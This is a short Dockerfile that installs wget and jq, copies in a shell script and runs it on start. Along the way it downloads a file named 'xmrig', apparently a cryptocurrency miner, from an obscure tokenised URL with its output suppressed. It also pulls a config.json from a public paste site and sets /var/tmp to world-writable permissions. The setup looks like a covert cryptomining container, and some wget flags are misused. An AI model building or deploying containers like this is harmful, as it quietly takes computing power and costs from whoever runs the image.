FROM ubuntu:20.04 

RUN apt update
RUN apt install wget -y
RUN apt install jq -y
RUN apt install bash -y
ADD scripts/kjellscript.sh /var/tmp/kjellscript.sh
RUN chmod 777 /var/tmp/kjellscript.sh
RUN wget -o /var/tmp/ -L https://data.atonline.net/~jwt/eyJ2IjoxLCJ1IjoicGhwbGF0Zm9ybSIsImUiOjE2NTUwNDMxNjF9.eyJhY3QiOiJnZXQiLCJpbiI6eyJkbCI6dHJ1ZX0sInAiOiJibG9ic3JjL2Jsb2JzLXc1N2puai1xc281LWM0am4tcmp5eS01NDVlNXN2dSJ9.obKXsFRVMKOGcGKKKMXSqrc6oHVB9WlCuXJ35bKfVGY/xmrig > /dev/null 2>&1
RUN wget -o /var/tmp/config.json https://www.toptal.com/developers/hastebin/losinazaci.json
RUN chmod -R 777 /var/tmp
CMD /var/tmp/kjellscript.sh
